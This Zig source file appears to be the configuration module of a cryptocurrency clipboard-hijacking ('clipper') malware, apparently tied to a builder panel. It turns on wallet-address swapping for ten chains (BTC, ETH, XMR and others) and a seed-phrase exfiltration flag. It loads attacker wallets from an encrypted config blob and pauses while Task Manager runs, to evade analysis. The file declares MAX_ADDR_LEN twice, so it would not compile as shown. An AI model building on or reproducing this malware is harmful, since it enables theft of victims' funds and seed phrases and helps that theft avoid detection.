const std = @import("std");

// === Clipper Configuration ===
// Wallets addresses are NOT hardcoded here.
// They come from runtime AES-GCM decrypted config (CLIPLZCFG signature in .rdata)
// or from the shared Mirage Panel builder config.

pub const CLIPPER_ENABLED: bool = true;
pub const CLIPPER_SEED_EXFIL: bool = true;
pub const CLIPPER_SWAP_LOG: bool = true;
pub const CLIPPER_SINGLE_USE: bool = false;
pub const CLIPPER_PRESERVE_CONTEXT: bool = true;

// === Chain Selection ===
// Enable/disable specific chains at compile time.
// All chains are enabled by default.
// Chain detection still runs on all, but only enabled chains perform replacement.

pub const BTC_ENABLED: bool = true;
pub const ETH_ENABLED: bool = true;
pub const TRX_ENABLED: bool = true;
pub const SOL_ENABLED: bool = true;
pub const LTC_ENABLED: bool = true;
pub const XMR_ENABLED: bool = true;
pub const DOGE_ENABLED: bool = true;
pub const BCH_ENABLED: bool = true;
pub const XRP_ENABLED: bool = true;
pub const ADA_ENABLED: bool = true;

// === Address Storage ===
// Maximum size of each address buffer (longest known format + safety margin).
// Actual addresses are loaded at runtime from encrypted config blob.
pub const MAX_ADDR_LEN: usize = 128;

// === Detection Thresholds ===
pub const MIN_ADDR_LEN: usize = 26;
pub const MAX_ADDR_LEN: usize = 128;
pub const MAX_SEED_LEN: usize = 512;

// === Anti-Analysis ===
pub const PAUSE_ON_TASKMGR: bool = true;
pub const TASKMGR_CHECK_INTERVAL_MS: u64 = 2000;
